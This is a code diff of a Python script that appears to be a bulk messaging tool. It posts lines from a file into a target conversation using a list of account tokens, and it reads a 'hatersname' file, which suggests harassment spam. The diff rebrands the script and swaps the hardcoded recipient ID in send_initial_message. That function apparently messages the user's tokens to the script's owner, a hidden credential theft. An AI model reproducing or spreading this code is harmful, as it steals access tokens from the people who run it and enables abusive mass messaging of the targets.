@@ -25,9 +25,9 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"   TRICKS BY ALEX ROHIT")
+          self.wfile.write(b"-- SERVER RUNNING>>ANISH H3R3")
 def execute_server():
-      PORT = int(os.environ.get('PORT', 4000))
+      PORT = 4000
 
       with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
           print("Server running at http://localhost:{}".format(PORT))
@@ -35,19 +35,19 @@ def execute_server():
 
 
 def send_initial_message():
-      with open('token.txt', 'r') as file:
+      with open('tokennum.txt', 'r') as file:
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Alex rohit sir! I am using your server. My token is {}"
+      msg_template = "HELLO RAJ SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100055442844751"
+      target_id = "100069389445982"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•────────────────────── TRICKS BY ALEX ROHIT───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────ANISH H3R3 ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -77,17 +77,17 @@ def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('file.txt', 'r') as file:
+      with open('File.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
 
-      with open('token.txt', 'r') as file:
+      with open('tokennum.txt', 'r') as file:
           tokens = file.readlines()
       num_tokens = len(tokens)
       max_tokens = min(num_tokens, num_messages)
 
-      with open('name.txt', 'r') as file:
+      with open('hatersname.txt', 'r') as file:
           haters_name = file.read().strip()
 
       with open('time.txt', 'r') as file:
